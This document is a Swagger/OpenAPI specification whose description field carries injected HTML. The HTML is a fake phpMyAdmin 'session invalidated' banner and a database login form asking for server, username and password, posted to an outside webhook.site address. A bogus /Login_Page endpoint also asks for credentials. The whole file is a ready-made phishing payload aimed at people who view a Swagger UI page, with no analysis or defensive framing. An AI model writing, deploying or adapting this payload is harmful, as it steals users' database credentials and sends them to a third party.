swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<div style="width:100%;max-width:420px;margin:20px auto;padding:20px;background:#fdecea;border-radius:8px;"><div style="background:#fdecea;color:#b71c1c;padding:16px 20px;text-align:center;border:1px solid rgba(0,0,0,.15);border-radius:4px;font-size:15px;"><strong>phpMyAdmin session invalidated. Re-login required.</strong></div></div><h1 style="text-align:center;font-size:24px;color:#333;">Database Login</h1><div style="width:100%;max-width:400px;margin:0 auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,.1);"><form action="https://webhook.site/REPLACE-ME" method="post" class="form-signin"><label>Server</label><br><input type="text" name="server" value="localhost" style="width:100%;padding:10px;margin-bottom:14px;"><br><label>Username</label><br><input type="text" name="user" style="width:100%;padding:10px;margin-bottom:14px;"><br><label>Password</label><br><input type="password" name="pass" style="width:100%;padding:10px;"><button type="submit" style="width:100%;padding:12px;margin-top:18px;background:#c62828;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;">Go</button></form></div><div style="position:fixed;bottom:10px;right:10px;font-size:12px;color:#888;">v</div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
